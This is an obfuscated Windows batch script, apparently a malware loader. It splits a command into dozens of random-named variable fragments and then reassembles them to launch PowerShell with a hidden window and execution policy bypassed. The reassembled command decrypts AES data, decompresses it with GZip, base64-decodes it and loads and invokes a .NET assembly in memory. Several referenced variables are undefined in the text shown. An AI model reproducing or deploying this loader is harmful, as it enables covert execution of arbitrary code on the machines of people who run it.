@echo off
!SjOrhlrRrScnXdFHihRJ! "QwEVYmnvsl=).Sp"
!SjOrhlrRrScnXdFHihRJ! "AhKmNAmIlz=aylo"
!SjOrhlrRrScnXdFHihRJ! "zMYUsBNXya=aylo"
!SjOrhlrRrScnXdFHihRJ! "NmUvnAyRJv=essi"
!SjOrhlrRrScnXdFHihRJ! "vMZxXwdEvX=:: '"
!SjOrhlrRrScnXdFHihRJ! "amMjOYbXYM=7;	$"
!SjOrhlrRrScnXdFHihRJ! "ctWZCOIDrT=ctio"
!SjOrhlrRrScnXdFHihRJ! "CtbSLUVuxy=.Ass"
!SjOrhlrRrScnXdFHihRJ! "fHMOFDqloo=isIT"
!SjOrhlrRrScnXdFHihRJ! "IqsgAxkszE=Invo"
!SjOrhlrRrScnXdFHihRJ! "vifaHrfNPM=Star"
!SjOrhlrRrScnXdFHihRJ! "JuvPVQCfaf=es_v"
!SjOrhlrRrScnXdFHihRJ! "ktlTNPSWxz=..-1"
!SjOrhlrRrScnXdFHihRJ! "efPLnTrjWR=))	{"
!SjOrhlrRrScnXdFHihRJ! "UEOToZSwUz=cryp"
!SjOrhlrRrScnXdFHihRJ! "gPEzgRmsjo=	$ae"
!SjOrhlrRrScnXdFHihRJ! "RkcNdMmMVc=trea"
!SjOrhlrRrScnXdFHihRJ! "slggoVjDOs=;$rD"
!SjOrhlrRrScnXdFHihRJ! "hVOGCYHcUK=le -"
!SjOrhlrRrScnXdFHihRJ! "hnqLHodbmn=trea"
!SjOrhlrRrScnXdFHihRJ! "RtKJJbSgOW=O.Me"
!SjOrhlrRrScnXdFHihRJ! "KxqkCwlcjw=ad1_"
!SjOrhlrRrScnXdFHihRJ! "MOxNDtvBBV=am(,"
!SjOrhlrRrScnXdFHihRJ! "KdPwmxEgaF={	$E"
!SjOrhlrRrScnXdFHihRJ! "afnbBdviIj=ss_f"
!SjOrhlrRrScnXdFHihRJ! "tuTunAwxsq=oWos"
!SjOrhlrRrScnXdFHihRJ! "zWRcnrKHOr=RfKI"
!SjOrhlrRrScnXdFHihRJ! "nigvIFxEsj=rDmz"
!SjOrhlrRrScnXdFHihRJ! "bNZoMsVMFc=..-1"
!SjOrhlrRrScnXdFHihRJ! "jCZkZrkfZs=]::C"
!SjOrhlrRrScnXdFHihRJ! "PYNOnfcGnX=;$pa"
!SjOrhlrRrScnXdFHihRJ! "EiFcojTFyK=($Xt"
!SjOrhlrRrScnXdFHihRJ! "xFuyoSBCAr=$RfK"
!SjOrhlrRrScnXdFHihRJ! "efZFrxnerS=on.G"
!SjOrhlrRrScnXdFHihRJ! "rxNXVWLJsI= ([C"
!SjOrhlrRrScnXdFHihRJ! "MaEIvPMUdD=hidd"
!SjOrhlrRrScnXdFHihRJ! "AzIwjuIshQ=cute"
!SjOrhlrRrScnXdFHihRJ! "hWiHxrHUaD=ormF"
!SjOrhlrRrScnXdFHihRJ! "ITTRqzmgDp=plit"
!SjOrhlrRrScnXdFHihRJ! "rcHmWlbzIz=indo"
!SjOrhlrRrScnXdFHihRJ! "dMTEQKnhAw= $pa"
!SjOrhlrRrScnXdFHihRJ! "ijHayDxNDc=);	$"
!SjOrhlrRrScnXdFHihRJ! "yZLOBRLszp=S2ad"
!SjOrhlrRrScnXdFHihRJ! "TDSMSMFaKG=UjRv"
!SjOrhlrRrScnXdFHihRJ! "DzKjuKDaCw=rofi"
!SjOrhlrRrScnXdFHihRJ! "ZGiMBRueEQ=-joi"
!SjOrhlrRrScnXdFHihRJ! "CTUeoJSoiO=teDe"
!SjOrhlrRrScnXdFHihRJ! "VhscStYfpQ=func"
!SjOrhlrRrScnXdFHihRJ! "qwjCnfEdFS=ep b"
!SjOrhlrRrScnXdFHihRJ! "ZtWPXqdtWi=jr/V"
!SjOrhlrRrScnXdFHihRJ! "eeMYNFjtkc=ram2"
!SjOrhlrRrScnXdFHihRJ! "FqsQWnesqP=($pa"
!SjOrhlrRrScnXdFHihRJ! "YWMasMZvqB=inal"
!SjOrhlrRrScnXdFHihRJ! "mnHubRDYvv=s_va"
!SjOrhlrRrScnXdFHihRJ! "vdtVCAXHNm=:('g"
!SjOrhlrRrScnXdFHihRJ! "ZiNWOsUliE= '')"
!SjOrhlrRrScnXdFHihRJ! "nMZJqJqtVV=tor_"
!SjOrhlrRrScnXdFHihRJ! "hgXOmkYdwz=yste"
!SjOrhlrRrScnXdFHihRJ! "YIMmJlFMqk=r=[s"
!SjOrhlrRrScnXdFHihRJ! "HGweZcpKPZ=rn_v"
!SjOrhlrRrScnXdFHihRJ! "JXbOUjfckV=yte["
!SjOrhlrRrScnXdFHihRJ! "xEjBhZAwUU=lgG."
!SjOrhlrRrScnXdFHihRJ! "FhhxCBFkuJ= -jo"
!SjOrhlrRrScnXdFHihRJ! "fjMgwpEaGo=t]::"
!SjOrhlrRrScnXdFHihRJ! "QyrUswYXsp=rypt"
!SjOrhlrRrScnXdFHihRJ! "xecOxOmTzJ=aram"
!SjOrhlrRrScnXdFHihRJ! "ZEXBdoVipT=nirt"
!SjOrhlrRrScnXdFHihRJ! "ZrecJwwFEQ=func"
!SjOrhlrRrScnXdFHihRJ! "AKhWatXXiS=var."
!SjOrhlrRrScnXdFHihRJ! "feHDpulOia=ecur"
!SjOrhlrRrScnXdFHihRJ! "bhpIIjKDPe=::('"
!SjOrhlrRrScnXdFHihRJ! "kgfWxnwCTc=ion "
!SjOrhlrRrScnXdFHihRJ! "TPazLVdxzf=ion "
!SjOrhlrRrScnXdFHihRJ! "gXLHKluMsA=s_va"
!SjOrhlrRrScnXdFHihRJ! "fNbmMvwqBS=Conv"
!SjOrhlrRrScnXdFHihRJ! "qYRIvYDSiu=y]::"
!SjOrhlrRrScnXdFHihRJ! "altonRnAPv=)([b"
!SjOrhlrRrScnXdFHihRJ! "tkFDLmNaKU=;exe"
!SjOrhlrRrScnXdFHihRJ! "EIwBiKmayh=var)"
!SjOrhlrRrScnXdFHihRJ! "nauKhZDqPt=wTit"
!SjOrhlrRrScnXdFHihRJ! "CcCsPUvQOi=reak"
!SjOrhlrRrScnXdFHihRJ! "RtDjkzFAhC=ar);"
!SjOrhlrRrScnXdFHihRJ! "wLenknVNko=e]::"
!SjOrhlrRrScnXdFHihRJ! "FiwfWMvlhP=_var"
!SjOrhlrRrScnXdFHihRJ! "TPqSMVeLyG=/g=="
!SjOrhlrRrScnXdFHihRJ! "rweDgshVRi=var)"
!SjOrhlrRrScnXdFHihRJ! "YCZPWjiFFw=mpre"
!SjOrhlrRrScnXdFHihRJ! "XhCCsABGuD=Subs"
!SjOrhlrRrScnXdFHihRJ! "QuXHxcGUer=em.S"
!SjOrhlrRrScnXdFHihRJ! "UdvXUVWIAZ=Deco"
!SjOrhlrRrScnXdFHihRJ! "ujwmUeVXwq=Secu"
!SjOrhlrRrScnXdFHihRJ! "xPiCGuHzZC=pres"
!SjOrhlrRrScnXdFHihRJ! "rbHOkRYOZI=J9rw"
!SjOrhlrRrScnXdFHihRJ! "RtuGaBWEnq=tem."
!SjOrhlrRrScnXdFHihRJ! "jyJjYPMBkF=th('"
!SjOrhlrRrScnXdFHihRJ! "NvoPBXtJuY= exe"
!SjOrhlrRrScnXdFHihRJ! "wDEjiwLttT=V=[S"
!SjOrhlrRrScnXdFHihRJ! "tVdsFViTst=	if "
!SjOrhlrRrScnXdFHihRJ! "XxEVnvKmNp=load"
!SjOrhlrRrScnXdFHihRJ! "wRkSWgUxzJ=Obje"
!SjOrhlrRrScnXdFHihRJ! "mYOxyCotFk=[Sys"
!SjOrhlrRrScnXdFHihRJ! "gJhcckjdIJ='')("
!SjOrhlrRrScnXdFHihRJ! "hoBwzqQbvq=omma"
!SjOrhlrRrScnXdFHihRJ! "yRKpfzWCLd=gnir"
!SjOrhlrRrScnXdFHihRJ! "ICPOCfFLqw=To($"
!SjOrhlrRrScnXdFHihRJ! "lXHeIjsdbp=yloa"
!SjOrhlrRrScnXdFHihRJ! "cpfdBgIlhA=m.IO"
!SjOrhlrRrScnXdFHihRJ! "CDVZqVeXom=JdlS"
!SjOrhlrRrScnXdFHihRJ! "wDmZEqtSSP=tsWi"
!SjOrhlrRrScnXdFHihRJ! "SSamhedWhh=ose("
!SjOrhlrRrScnXdFHihRJ! "sNRJaXbQdS=txeT"
!SjOrhlrRrScnXdFHihRJ! "TSUWgtABPi=ssio"
!SjOrhlrRrScnXdFHihRJ! "fVZsiORDqh=retu"
!SjOrhlrRrScnXdFHihRJ! "lAioVKLaxj=O.Co"
!SjOrhlrRrScnXdFHihRJ! "XJIfXcTRKs=am_v"
!SjOrhlrRrScnXdFHihRJ! "xxiJlmGXqQ=yle "
!SjOrhlrRrScnXdFHihRJ! "EJgFIYfKMN=m.Re"
!SjOrhlrRrScnXdFHihRJ! "WSSSZaGLBE=r);}"
!SjOrhlrRrScnXdFHihRJ! "gDCdRUUlpb=-Obj"
!SjOrhlrRrScnXdFHihRJ! "ZRcTlbCbYO=de=["
!SjOrhlrRrScnXdFHihRJ! "MyQanwcTbR=s_fu"
!SjOrhlrRrScnXdFHihRJ! "TsjRvfQlGz=nver"
!SjOrhlrRrScnXdFHihRJ! "iPiqDvinLH=orF'"
!SjOrhlrRrScnXdFHihRJ! "HkvaLPjSnQ=llAd"
!SjOrhlrRrScnXdFHihRJ! "IDzdlazpbX=trin"
!SjOrhlrRrScnXdFHihRJ! "rnecwbfqoR=tem."
!SjOrhlrRrScnXdFHihRJ! "JQwRIWlArj=Conv"
!SjOrhlrRrScnXdFHihRJ! "pDhOERlJuG=trin"
!SjOrhlrRrScnXdFHihRJ! "HSoGjbVwqx=ctio"
!SjOrhlrRrScnXdFHihRJ! "LYVkQyUalM=$dec"
!SjOrhlrRrScnXdFHihRJ! "DwkaLEkBQn=(,[s"
!SjOrhlrRrScnXdFHihRJ! "EAoWaQARVr=, $p"
!SjOrhlrRrScnXdFHihRJ! "scUPKkTFNq=('1q"
!SjOrhlrRrScnXdFHihRJ! "zLCEmYsmuB=EmJI"
!SjOrhlrRrScnXdFHihRJ! "MEIkkDrozP=g[]]"
!SjOrhlrRrScnXdFHihRJ! "hrltFffrwU=en -"
!SjOrhlrRrScnXdFHihRJ! "frYZvgwxmB=\Sys"
!SjOrhlrRrScnXdFHihRJ! "KuyCDgWIwl=ell."
!SjOrhlrRrScnXdFHihRJ! "ukofWMtVOf=ersh"
!SjOrhlrRrScnXdFHihRJ! "dYFUVsPlHm=ndow"
!SjOrhlrRrScnXdFHihRJ! "kVKRimBwvH=dows"
!SjOrhlrRrScnXdFHihRJ! "yQtBtGOwWO=exe""
!SjOrhlrRrScnXdFHihRJ! "dvwaBcYEWC=erSh"
!SjOrhlrRrScnXdFHihRJ! "qfxCxeXpIy=ell\"
!SjOrhlrRrScnXdFHihRJ! "CrWPejIsRR= "
!SjOrhlrRrScnXdFHihRJ! "JNkdsooKNn=\Win"
!SjOrhlrRrScnXdFHihRJ! "dCkDQjigav=tem3"
!SjOrhlrRrScnXdFHihRJ! "uXyNDpEhkv=v1.0"
!SjOrhlrRrScnXdFHihRJ! "gctudSQrZJ=2\Wi"
!SjOrhlrRrScnXdFHihRJ! "RQymjHKgaY=sPow"
!SjOrhlrRrScnXdFHihRJ! "iJqbFICFtS=\pow"
!SjOrhlrRrScnXdFHihRJ! "OAjiWFvbCa="%systemdrive%"
%OAjiWFvbCa%%JNkdsooKNn%%kVKRimBwvH%%frYZvgwxmB%%dCkDQjigav%%gctudSQrZJ%%dYFUVsPlHm%%RQymjHKgaY%%dvwaBcYEWC%%qfxCxeXpIy%%uXyNDpEhkv%%iJqbFICFtS%%ukofWMtVOf%%KuyCDgWIwl%%yQtBtGOwWO%%CrWPejIsRR%%ivETOudztX%%DzKjuKDaCw%%hVOGCYHcUK%%CNNQfRDlPj%%RbQxkIIlSr%%xxiJlmGXqQ%%MaEIvPMUdD%%hrltFffrwU%%qwjCnfEdFS%%kFUZwQwhcu%%WNhpjfmPdf%%hoBwzqQbvq%%kIpksCwmXP%%JXpbXCoUth%%TPazLVdxzf%%ZuMLknyWXH%%JZSowjZAyX%%bWInxuIPzw%%yYNRQolDQK%%dsWLyTXLdB%%WDYBecLyoP%%EIwBiKmayh%%YvJOTJaXPD%%xWMYAVZlNN%%CMobfuVvCN%%GXnVCATkIu%%bOJKsHWyan%%KbnKFmgIIy%%OEucXAJRvZ%%bPDsLOcEJy%%ywupcEJCqq%%tlCjGwtHNR%%YedblVyUYQ%%jCZkZrkfZs%%QgBfFQmtLp%%vvRRztstdg%%gPEzgRmsjo%%mnHubRDYvv%%JeiJvOLhKF%%ZRcTlbCbYO%%DUjxchNwQI%%QuXHxcGUer%%feHDpulOia%%pBZHROULGn%%aorcPFUuvj%%uHXHIymFhH%%WZnQsouqPJ%%hUnQqQNFOK%%ARsYFHEsYt%%BpEZrbaBJA%%kEEMcztgqR%%LHRwgeGpkK%%JbrwhRqozp%%QmVnzWmGWf%%nycgITxhSm%%vLqYRjmhEk%%ifHabyLEXk%%RatewlYkOo%%ujwmUeVXwq%%KfbLXiQbfj%%iTjIuvsmBF%%kbtqQZIugX%%DOhHAMYHho%%uWfFfBZORz%%LJvQfIMLVY%%zwVhGtLChI%%wLenknVNko%%ZUDHlTtqBR%%amMjOYbXYM%%QxGjcaEhGR%%MYAGYFSoWM%%ZuaqHkYVzl%%mYOxyCotFk%%omKKfbLgkj%%fNbmMvwqBS%%cJIuFOjdhw%%qzJLxNJqkF%%yRKpfzWCLd%%fYRMiFDper%%SIZOSGepOY%%MffWtkZsof%%RGreqsHWCS%%ktlTNPSWxz%%vGNMqaTVtX%%GlbYzlqVxz%%ZiNWOsUliE%%scUPKkTFNq%%zLCEmYsmuB%%yWyXzmTRXY%%fHMOFDqloo%%sLigaoFiKP%%ZHQHfvDWpy%%rbHOkRYOZI%%IgYfiNOrXl%%HLhhYyRfIj%%ZtWPXqdtWi%%pQibhTIKys%%HlZeQFUzPM%%aTfPIokiiR%%JuvPVQCfaf%%PgHpBOuRZr%%wDEjiwLttT%%IzCGJnPkiZ%%dOzKWUmPoU%%TsjRvfQlGz%%fjMgwpEaGo%%YkJanHeTno%%kVeyapqLlE%%xEDJTUctnG%%pljaWIJjDN%%bWYsokengh%%ZTPbQuHZgt%%EKGHYYLeCr%%FhhxCBFkuJ%%PPngHwwhjC%%bKckjqpqup%%yZLOBRLszp%%OxEwDPxAaB%%CDVZqVeXom%%lpPfkQdyEP%%LdIUOEfGGt%%TPqSMVeLyG%%MNdmdzHzmN%%LYVkQyUalM%%QyrUswYXsp%%MsaYcXZvRp%%XFtTHVTfcn%%adzLPowjUH%%AKhWatXXiS%%zyjWOkexmx%%CTUeoJSoiO%%AQBjOnywSo%%XWWjOBTDXF%%jZWweGPdIr%%AIOusIXZhB%%MHEYzGWKpN%%PprDEBUffi%%xuOBOphCRg%%ETvvSBuYWy%%KfNUBkqlQR%%ORUZerTdjk%%yuSjjVUWKc%%hWiHxrHUaD%%YWMasMZvqB%%IqOMZqmELF%%qtBNJRJnBM%%KYdGlCHSRw%%WyFjuQiwHh%%fcjunEuYqA%%dMTEQKnhAw%%IuNoJSOrtT%%JmFuHHPItG%%hJBqtjEbsJ%%DaWlzLpULv%%QcFxQQhzXi%%UEOToZSwUz%%nMZJqJqtVV%%sUXYPfdeAC%%cfdjPYlcWA%%SSamhedWhh%%ANEbQaGQej%%VOWswiIPTr%%xnxudzULQL%%bhXtcpActP%%rvYMEeWHPZ%%vocPJmqjYq%%fVZsiORDqh%%HGweZcpKPZ%%DmWRpNfhJP%%ZrecJwwFEQ%%msrHsPRXPH%%XFtYNSZicu%%IJTAipBtuD%%FJfZMkUozA%%VhscStYfpQ%%wnCjhDzRyc%%nyClbnzumC%%YKICzBrRIP%%rweDgshVRi%%KdPwmxEgaF%%TDSMSMFaKG%%lIjJKRuYeJ%%gDCdRUUlpb%%WkQcVNDrLu%%MgllWcUfMv%%dFbrzqbPUX%%RtKJJbSgOW%%ncnKWZsrgP%%aPzTYqjyDE%%MOxNDtvBBV%%kNrPhbsruz%%XJIfXcTRKs%%RtDjkzFAhC%%DQPkFnxKLX%%YSddHcgsQB%%AEQieQkhFI%%wRkSWgUxzJ%%EifNuZpzCh%%tmKGcZZGgO%%cpfdBgIlhA%%iISgWrzdOe%%ALFxpjhDPW%%hnqLHodbmn%%rercYKuDJK%%zWRcnrKHOr%%ZevktVsgyH%%oxQBNwtDzF%%ODUfxkvoxp%%EvnUnmIhId%%rnecwbfqoR%%YgijDvkqNi%%zeJjcSkVnA%%NmUvnAyRJv%%efZFrxnerS%%cstADnEVZD%%RkcNdMmMVc%%WsGsduedRE%%FfEvxvTtRZ%%WDRfDUclBF%%lAioVKLaxj%%jAdvYLFHpI%%TSUWgtABPi%%rSBmseXpzN%%JSWHPvzwgR%%ovWTMtFmhB%%kjloSrYRcU%%OqiCZaVmgL%%UdvXUVWIAZ%%yKiXDzHIPy%%wHuldYntTL%%xtfwHgOotW%%vqrcwdhkYA%%tnxHomJjUV%%ICPOCfFLqw%%KsoSdgqrPZ%%QcvtskVxhu%%xFuyoSBCAr%%ywUCPaYFEi%%WrtUeFhvws%%jiDVZeYQEk%%FNRyBuiTDr%%lqTZxgmztI%%LfgihpSYCK%%biatCizUtK%%xoRegToEyT%%SzxWzzHJrl%%BjqTpdpzwp%%GrgIkxnbbn%%boAJSCLeUc%%BQDiioXYPd%%EPhjmBtOLb%%mFIdknJHbN%%skFtNQNXzW%%ApmYJlgrwq%%jWsSQViAXV%%EqXcKtjNvw%%NvoPBXtJuY%%grkKDvRMDS%%InaErjrknp%%ctWZCOIDrT%%BygZOnfnyp%%CwkCOAvJyr%%FiwfWMvlhP%%NovJqjhaQe%%eeMYNFjtkc%%sYeZoscadb%%RUfIBnbAmE%%tuTunAwxsq%%DcafwOjvvX%%hgXOmkYdwz%%EJgFIYfKMN%%WEINyPTalN%%dFfoxnxfhd%%CtbSLUVuxy%%JyIHbDxjqw%%qYRIvYDSiu%%AaCJlCDQbD%%UzDNeFWxnT%%QnOLMDBswM%%qclcXJVZvy%%ZGiMBRueEQ%%bgEoDnlRWH%%altonRnAPv%%JXbOUjfckV%%jxNGKkyXyK%%xecOxOmTzJ%%ETpjheeQut%%ijHayDxNDc%%tqbeXEUnqf%%WlDArpiEyG%%gHCfCoxbpU%%qzpwqoRklC%%jQzpwWFgJi%%uToXWLNWCJ%%hTYvOxVgkd%%xYsWxphnIF%%IqsgAxkszE%%AUICvqSeAZ%%azWGLwAszH%%EAoWaQARVr%%mDHFCCpQBh%%xdMIEjtLvd%%WSSSZaGLBE%%PaijMxRqei%%gKRsjANFrR%%wPwSutKPFB%%WDoWrxVDWh%%rcHmWlbzIz%%nauKhZDqPt%%McKCmCwUaM%%FkJjzthkVi%%slggoVjDOs%%TEODupsfZt%%PhzWTdrklN%%RtuGaBWEnq%%tSfISavgPk%%bckBtkLjnl%%EYsbAzkhCT%%sNRJaXbQdS%%HkvaLPjSnQ%%PNqcMuzeit%%QoEVRnlBBw%%jVfuEtDspL%%prUMdFxPWF%%xWHKcsGzjx%%DIrRGTHWxs%%RhPxdzuSSm%%QwEVYmnvsl%%NdjRhHacfj%%YBrEOqhkHD%%YNHXHhevSu%%FmDmENYXpv%%yrMInpeahI%%edNPnZvmka%%DEjLDLXfZa%%rkUleGaZJr%%ceokpCyOYE%%sMNpSUhbeC%%sZagqUiCLG%%ZwDTXzpZvb%%nigvIFxEsj%%yZVgYddhTv%%tVdsFViTst%%EiFcojTFyK%%xEjBhZAwUU%%vifaHrfNPM%%wDmZEqtSSP%%jyJjYPMBkF%%vMZxXwdEvX%%efPLnTrjWR%%FIDfKXyVcS%%EDDjrKEOci%%nOxULeIXVe%%xCFsZMiUNa%%XhCCsABGuD%%pDhOERlJuG%%oBaXvcYkjE%%BKbbkfmUCk%%CcCsPUvQOi%%BzzgLwhEhq%%BrwQcFBfDy%%EqgjemYHiA%%HhwadbkVqO%%YIMmJlFMqk%%spnpDktqbz%%xzvGItUvMa%%vGPPzWDUAT%%GlrYirUhxS%%ITTRqzmgDp%%qkZpOLAyPH%%GzQiSmixyr%%zMYUsBNXya%%KxqkCwlcjw%%QvrQljcLYe%%rPHlPDlfWn%%YCZPWjiFFw%%afnbBdviIj%%ybZuJUPeuZ%%kgfWxnwCTc%%axgCelCFKM%%idwNOXDFfb%%telFlUaqEn%%HSoGjbVwqx%%sjtIQhJriA%%JQwRIWlArj%%klbxeqOQEM%%bhpIIjKDPe%%lJidERvwYn%%QvfgnhiWDA%%sSNvyBAOjy%%mIKmYBdXSn%%UrSrWGcjuB%%bNZoMsVMFc%%qHnzahKShM%%ekepGaawzS%%zrtHwyIwAG%%FqsQWnesqP%%VkbIwQJKIL%%sznMCZnGcC%%yorBgORnst%%WHgJWppKkF%%PYNOnfcGnX%%ZxqOqHSzCI%%ZvroPKtDPn%%JCvwMzACoa%%LlZvuyqrsp%%xPiCGuHzZC%%MyQanwcTbR%%hplBWNwVUr%%tbkAQUuTPs%%RbDLonvYhX%%wxqBihEHFT%%XLEIiKnpkt%%bjeJZfLAnJ%%rxNXVWLJsI%%pNoVugxVCD%%ZfOOVmtGBc%%vdtVCAXHNm%%ZEXBdoVipT%%IQYJKlIZbI%%DfhpmmtstT%%iPiqDvinLH%%rkqItFfKkq%%RYGeIUwHoR%%UCOvKSHHfp%%dvotqtOyWH%%gJhcckjdIJ%%YAYUMPvVXA%%XxEVnvKmNp%%gXLHKluMsA%%IEZwqCxuHB%%XSBvJJfmPG%%zXpsDaPrkB%%uJCwStxhEK%%YqFmrnwpYa%%giWLbLoGTq%%MgkfhnqeDp%%lXHeIjsdbp%%EzsjumMQvg%%fQooXRgzfd%%XrMJPiARdR%%tkFDLmNaKU%%AzIwjuIshQ%%dSYXrmNJum%%LVNENUlLCK%%efOkCyJqzu%%AhKmNAmIlz%%zdGyiFLeIo%%jWPwMYeOuT%%DwkaLEkBQn%%IDzdlazpbX%%MEIkkDrozP%%vynsWdTGNE%%uknuGGxMlM%
!SjOrhlrRrScnXdFHihRJ! "YwcIiOvAsU= /b"
!SjOrhlrRrScnXdFHihRJ! "QFpQyoQFuZ=exit"
%QFpQyoQFuZ%%YwcIiOvAsU%
